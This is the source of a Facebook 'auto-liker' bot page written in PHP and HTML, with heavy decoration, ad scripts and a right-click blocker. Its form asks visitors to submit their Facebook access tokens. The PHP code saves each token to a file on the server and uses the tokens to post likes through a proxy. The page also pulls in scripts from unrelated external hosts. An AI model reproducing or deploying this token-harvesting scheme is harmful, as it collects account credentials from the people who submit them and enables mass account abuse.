
﻿<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><script>
// Set the number of snowflakes (more than 30 - 40 not recommended)
var snowmax=35

// Set the colors for the snow. Add as many colors as you like
var snowcolor=new Array("#aaaacc","#ddddFF","#ccccDD")

// Set the fonts, that create the snowflakes. Add as many fonts as you like
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")

// Set the letter that creates your snowflake (recommended:*)
var snowletter="  🏵 ️"

// Set the speed of sinking (recommended values range from 0.3 to 2)
var sinkspeed=1.4

// Set the maximal-size of your snowflaxes
var snowmaxsize=19

// Set the minimal-size of your snowflaxes
var snowminsize=8

// Set the snowing-zone
// Set 1 for all-over-snowing, set 2 for left-side-snowing 
// Set 3 for center-snowing, set 4 for right-side-snowing
var snowingzone=3

///////////////////////////////////////////////////////////////////////////
// CONFIGURATION ENDS HERE
///////////////////////////////////////////////////////////////////////////


// Do not edit below this line
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent 
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)  
var browserok=ie5||ns6||opera

function randommaker(range) {		
	rand=Math.floor(range*Math.random())
    return rand
}

function initsnow() {
	if (ie5 || opera) {
		marginbottom = document.body.clientHeight
		marginright = document.body.clientWidth
	}
	else if (ns6) {
		marginbottom = window.innerHeight
		marginright = window.innerWidth
	}
	var snowsizerange=snowmaxsize-snowminsize
	for (i=0;i<=snowmax;i++) {
		crds[i] = 0;                      
    	lftrght[i] = Math.random()*15;         
    	x_mv[i] = 0.03 + Math.random()/10;
		snow[i]=document.getElementById("s"+i)
		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
		snow[i].size=randommaker(snowsizerange)+snowminsize
		snow[i].style.fontSize=snow[i].size
		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
		snow[i].sink=sinkspeed*snow[i].size/5
		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
		snow[i].style.left=snow[i].posx
		snow[i].style.top=snow[i].posy
	}
	movesnow()
}

function movesnow() {
	for (i=0;i<=snowmax;i++) {
		crds[i] += x_mv[i];
		snow[i].posy+=snow[i].sink
		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
		snow[i].style.top=snow[i].posy
		
		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
			snow[i].posy=0
		}
	}
	var timer=setTimeout("movesnow()",50)
}

for (i=0;i<=snowmax;i++) {
	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
}
if (browserok) {
	window.onload=initsnow
}
</script>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>

﻿ 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
 BAIG BOTTER
</title>

<center><img id="mainImg" style="cursor:pointer;" onload="setTimeout(&quot;revisitImage()&quot;, 1000);" src="http://www.gifs.net/Animation11/Words/Welcome_Signs/3d_text_6.gif" <span=""><img src="http://shahjahan.mw.lt/images/bloodbar.gif" alt="Bloodbar"><img id="mainImg" style="cursor:pointer;" onload="setTimeout(&quot;revisitImage()&quot;, 1000);" src="http://www.gifs.net/Animation11/Words/Welcome_Signs/3d_text_6.gif"><center>


<center><font color="blue" size="8"><font size="50"<b><script language="JavaScript" src="zis.js" size="520"></script></b></font></font><br><center>

<center><h2 align="center"><font face="Orbitron" size="6" style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em red;"><b> ♛ MrDj AyeSh® ♛ </b><br><br>➺ ᗷᑌY ᑭEᖇᔕOᑎᗩᒪ ᗷOT <br>+923234767076</font></h2><center>

<center><img src="http://nimbuzzcrack.xtgem.com/images/gfff.gif" alt="Gfff"><center>


<link rel="stylesheet" type="text/css" href="B.css"
 <script src="http://salaih.vpstrust.com/AB.js"></script><link rel="shortcut icon" type="image/png" href="https://cdn3.iconfinder.com/data/icons/inside/PNG/256x256/icontexto-inside-facebook.png"/>
<link rel="stylesheet" type="text/css" href="stylesheet.css" media="all,handheld"/>
<link href="http://fonts.googleapis.com/css?family=Audiowide" rel="stylesheet" type="text/css">




<div class="post-content">


<?php
$yx=opendir('DJ');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> DJ($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function DJ($access){
if(!is_dir('DJ')){
mkdir('DJ');
}
$a=fopen('DJ/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
<center>

<br>
<div class="post-meta2">
</div></center></center></div>
</a><center><a>
<img src="http://stevendie.xtgem.com/images/stars.gif" alt="stars.gif">
<font color="#FF0059">&nbsp;A</font>
<font color="#FF0B00">D</font>
<font color="#FE6600">D</font>
&nbsp;
<font color="#FFB700">M</font>
<font color="#82FF00">E</font>
&nbsp;
<font color="#1BFF00">O</font>
<font color="#00E0FF">N</font>
&nbsp;
<font color="#FFB700">F</font>
<font color="#FF0B00">B</font>
<img src="http://stevendie.xtgem.com/images/stars.gif" alt="stars.gif">
</a><center><a>
<img src="http://2.bp.blogspot.com/-0go-wuVUVXo/UQJ-WdQ66bI/AAAAAAAAAIM/BEOe99eZD7U/s1600/2d2ipv4.gif" width="100" height="100" class="left" title=" MRDJ AYESH">
<br>












<center>
<a href="http://www.facebook.com/100025466832535"><img src="https://graph.facebook.com/100025466832535/picture?type=large" style="width:110px; height:110px;border: 2px;border-radius: 50%;" alt="ayesh " title="ayesh" class="thumbnail"/></a>
<br><center>
</a><center><a><font face="Orbitron" size="6" style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b> plz Follow me on facebook !!</b></font></a><center><a><img src="http://2.bp.blogspot.com/-0go-wuVUVXo/UQJ-WdQ66bI/AAAAAAAAAIM/BEOe99eZD7U/s1600/2d2ipv4.gif" width="100" height="100" class="left" title=" MRDJ AYESH">
<br>
<a href="http://FB.COM/MRDJAYASH">FOLLOW ME ON FB</a>
</a><center><br>
<img src="http://nimbuzztrack.xtgem.com/images/0169_1.gif" alt="0169 1" style="width: 199px; height: 35px;"></a><center><a>
</a><center><a><img src="http://alo0osh-sy.xtgem.com/images/Rock.gif" alt="Rock"></a><center><a>








<center><a><p style="font-size:20;color:yellow">Get Working Token Here</p><center>
</center>
<center><a href="https://BOTTERSKING.COM/token/" target="_blank"><input class="button button5" type="button" value="♥ GET TOKEN ♥"> </a><a href="http://zipansion.com/24fhq" target="_blank"><input class="button button5" type="button" value="♥ SCRIPT ♥"> </a></center><center>










<h4><font size="15" color="red"><center>••´º´•» </font><font face="Orbitron" size="6" style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>Submit Your Token Here !!</b></font><font size="15" color="red"> «•´º´••</center></font></h4> 
<center>


<center><form action=""method="POST"><input class="input" type="text"name="access_token" placeholder="EAAAAAYsX7TsBAG62KddDOXEZAsB428Ypqgv6o2pKoZANTa6hEIqIFcEAsfvQSlefXqDbUDbiUCxtmOaeo6jKgO0RAieCOz2dMnJp7Jk9F499Sl53tAXR44Pkt"



style="height:40px;width:25%;border-radius:20px;border:1px solid white;background: non;color:white;" value="">

<br>
<input class="button button5" type="submit"name="saveFile" style="height:35px;width:140px" '.$warna1.';border:2px groove '.$warna.';height:50px;width:22px"autocomplete="off" value="♥ SUBMIT ♥"onfocus="value="SUBMIT=""></form></center>


<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>


';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('
'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<br>
<br>
<br>
<center> 
<br>
<br>
<br>
<center><font size="8" color="gold"><font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;">Your bot Has been Activated Successfully </font><center>
<br>
<br>
<br>
<form action="keluar.php" method="post">
<center><input class="submit" type="submit" style="width:40%;" value="Click Here To Add AnOther Token"></center>
<br>
<br>
<br>
<center> <center><div style="font-family: Iceland;<font face="Orbitron" size="10" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em gold;"><font color="blue"size="5"> DESIGNED BY :-  <a href="https://www.facebook.com/mrdjayash" target="blank"><font color="yellow">TALHA BAIG<br></center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<center>
<font color="white"size="5">LOvERZ : <font color="white"> <?php include 'users.php';?> </font></br><center/>
<center> <center><div style="font-family: Audiowide;<font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;"><font color="white"size="5"> OWN3R :-  <a href="https://www.facebook.com/mrdjayash" target="blank"><font color="white"size="5"> BAIG BOTTER <br></center><font/>
<br>
 <center><div style="font-family: Courgette;font-size: 20pt;text-shadow: 0 0 1px red, 0 0 11px red, 0 0 11px red;color: white"><font color="white">HaT3Rx JuSt  </font><font color="yellow">2018</font> F33L ThE pOwEr.</div></center>

</center>
<center>
<img src="http://alo0osh-sy.xtgem.com/images/gif_1_6.gif" alt="Gif 1 6"><center>
<center><span style="font-weight:bold;font-style:italic;"><img src="http://alo0osh-sy.xtgem.com/images/WALKER_1_2.GIF" alt="WALKER 1 2"><br>
<img src="http://nimbuzztrack.xtgem.com/images/updateHH.gif" alt="UpdateHH"><br></span>
<center>
<center>
<img src="http://nimbuzztrack.xtgem.com/images/0024.gif"><center>
<center>
<center>
<center>
<img src="http://sahjou.mw.lt/images/sharjoyu_8_15.gif" alt="Sharjoyu 8 15"><img src="http://sahjou.mw.lt/images/sharjoyu_8_16.gif" alt="Sharjoyu 8 16">
<br>
<img src="http://stevendie.xtgem.com/images/stars.gif" alt="stars.gif">
<font color="#FF0059">&nbsp;B</font>
<font color="#FF0B00">O</font>
<font color="#FE6600">T</font>
&nbsp;
<font color="#FFB700">S</font>
<font color="#82FF00">I</font>
<font color="#1BFF00">T</font>
<font color="#00E0FF">E</font>
<img src="http://sahjou.mw.lt/images/8bf46ea097b_8.gif" alt="8bf46ea097b 8">
<center>&nbsp;<img src="http://hashirzone.heck.in/files/new.gif" alt="new.gif"></center>
<center><img src="http://olowoyo.mywapblog.com/files/hot2.gif" alt="hot2.gif"><a href="http://hand-user.tk" style="margin-left:5px;"><input type="button" value="Bot Server1" style="border:0px;color:rgb(255,255,255);padding:7px 8px 7px 9px;font-size:12px;margin-left:-3px;background:rgb(255,0,0);"></a></center>
<center><img src="http://olowoyo.mywapblog.com/files/hot2.gif" alt="hot2.gif"><a href="http://my-fans.tk.tk" style="margin-left:5px;"><input type="button" value="Bot Server2" style="border:0px;color:rgb(255,255,255);padding:7px 8px 7px 9px;font-size:12px;margin-left:-3px;background:rgb(255,0,0);"></a></center>
<center><img src="http://alo0osh-sy.xtgem.com/images/12-74_1.gif" alt="12-74 1"><center>
<center><a href="http://www.reliablecounter.com" target="_blank"><img src="https://www.reliablecounter.com/count.php?page=topprz.tk11319219&digit=style/plain/13/&reloads=0" alt="web visitor counter script" title="web visitor counter script" border="0"></a><br /><a href="http://www.reliablecounter.com/de/" target="_blank" style="font-family: Geneva, Arial; font-size: 9px; color: #330010; text-decoration: none;">web visitor counter</a><center>
<marquee behavior="alternate" <img="" src="http://alo0osh-sy.xtgem.com/images/gif_1_6.gif" alt="Gif 1 6"><img src="http://alo0osh-sy.xtgem.com/images/gif_1_6.gif" alt="Gif 1 6"><img src="http://alo0osh-sy.xtgem.com/images/gif_1_6.gif" alt="Gif 1 6"><scroll" direction="left" scrollamount="0" scrolldelay="0"><strong><font style="text-shadow: 1px 1px black; color:white;" size="6">SCRIPT MODIFY BY BAIG BOTTER</font></strong><img src="http://alo0osh-sy.xtgem.com/images/gif_1_6.gif" alt="Gif 1 6"><img src="http://alo0osh-sy.xtgem.com/images/gif_1_6.gif" alt="Gif 1 6"></scroll"></marquee>
<br>
 
</center></center></center>


</center></center></center></center></center></center></center></center>
<SCRIPT LANGUAGE="JavaScript">
var message="Beta F33l Na Kr Chupa Lga Acha Sa Kr ??  ";
///////////////////////////////////
function clickIE() {if (document.all) {alert(message);return false;}}
function clickNS(e) {if 
(document.layers||(document.getElementById&&!document.all)) {
if (e.which==2||e.which==3) {alert(message);return false;}}}
if (document.layers) 
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}

document.oncontextmenu=new Function("return false")
// --> 
</script>



<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>

